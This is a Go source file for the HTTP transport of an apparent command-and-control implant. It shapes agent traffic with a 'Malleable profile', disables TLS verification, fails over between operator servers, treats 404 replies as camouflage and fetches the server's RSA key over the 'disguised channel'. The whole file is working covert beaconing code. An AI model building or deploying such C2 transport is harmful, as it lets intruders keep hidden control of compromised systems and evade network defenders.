package transport

import (
	"crypto/rsa"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"

	"wispp/protocol"
)

// HTTP sends Type1 envelopes shaped by a Malleable profile (plan §2.2).
type HTTP struct {
	servers []string
	prof    *protocol.Profile
	client  *http.Client
	ua      string // bound for the process lifetime: no UA flip mid-session
}

// NewHTTP builds a client; insecure skips TLS verification for self-signed
// listeners (session layer already authenticated, plan §3).
func NewHTTP(servers []string, prof *protocol.Profile, insecure bool) *HTTP {
	tlsCfg := &tls.Config{InsecureSkipVerify: insecure} //nolint:gosec // deliberate, see plan §3
	h := &HTTP{
		servers: servers,
		prof:    prof,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: &http.Transport{TLSClientConfig: tlsCfg},
		},
	}
	h.ua = prof.PickUA()
	return h
}

// Send posts an envelope, trying each server in order (failover).
func (h *HTTP) Send(env *protocol.Envelope) (*protocol.Envelope, error) {
	var lastErr error
	for _, s := range h.servers {
		req, err := h.prof.ApplyAgentRequest(s, h.ua, env.Marshal())
		if err != nil {
			return nil, err
		}
		resp, err := h.client.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
		resp.Body.Close()
		if resp.StatusCode == http.StatusNotFound {
			// Server rejected shape or session: look like a dead link backoff.
			lastErr = fmt.Errorf("transport: camo 404 from %s", req.URL)
			continue
		}
		out, err := h.prof.ParseResponse(body)
		if err != nil {
			lastErr = fmt.Errorf("transport: %s: %w", req.URL, err)
			continue
		}
		return out, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("transport: no servers configured")
	}
	return nil, lastErr
}

// Pubkey bootstraps the server RSA public key over the same disguised channel.
func (h *HTTP) Pubkey() (*rsa.PublicKey, error) {
	env, err := protocol.NewPlainEnvelope(protocol.MsgPubkey, "", nil)
	if err != nil {
		return nil, err
	}
	resp, err := h.Send(env)
	if err != nil {
		return nil, err
	}
	var pk protocol.PubkeyInfo
	if err := resp.DecodePlain(&pk); err != nil {
		return nil, err
	}
	return protocol.DecodePublicKeyPEM([]byte(pk.PEM))
}
